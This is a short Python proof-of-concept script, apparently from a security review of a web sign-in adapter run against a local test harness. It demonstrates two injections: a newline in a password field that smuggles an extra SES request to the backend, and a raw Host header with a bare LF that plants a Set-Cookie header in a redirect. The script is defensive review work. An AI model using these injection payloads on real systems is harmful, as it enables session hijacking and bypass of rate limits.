"""R8: the web's sign-in answer (form field v) is stripped at the ends only; a
newline inside it reaches CoreClient.req, which writes "AUT f <v>\\r\\n" as is.
The core reads it as two requests, so a public HTTP client can send any
request on the web's extension-channel connection, SES included, outside the
web's per-address SES limit, and the replies fall out of step with the pages.
Also R12: redirect() puts the raw Host header into Location; a bare LF in it
is a second response header.

    python3.13 review/r8_web_injection.py
"""
import asyncio
import re
from urllib.parse import quote

from harness import Stack, http, post


def lid_of(page):
    return re.search(r'name="lid" value="([^"]+)"', page).group(1)


def message(page):
    m = re.search(r"<p><b>(.*?)</b></p>", page)
    return m.group(1) if m else page.split("\r\n")[0]


async def main():
    s = Stack("password", adapters=[("web", "adapters.web")]).start()
    w = s.ports["web"]
    try:
        p = await http(w, post("/login.htm", "n=mallory"))                    # sign-up: choose a password
        v = "longpassword1\nSES AAAAAAAAAAAAAAAAAAAAAA"                         # 39 characters, under 64
        p = await http(w, post("/login.htm", "lid=%s&f=password&v=%s" % (lid_of(p), quote(v))))
        print("after the injected answer the web shows:", re.search(r"<p>(Type it again:?)", p).group(1))
        p = await http(w, post("/login.htm", "lid=%s&f=confirm&v=longpassword1" % lid_of(p)))
        print("the next page reads the reply to the injected SES:", message(p))

        print("\n== R12: Host header into Location ==")
        r = await http(w, "GET / HTTP/1.0\r\nHost: evil.example\nSet-Cookie: pn=AAAAAAAAAAAAAAAAAAAAAA\r\n\r\n")
        print(r.split("\r\n\r\n")[0])
    finally:
        s.stop()


asyncio.run(main())
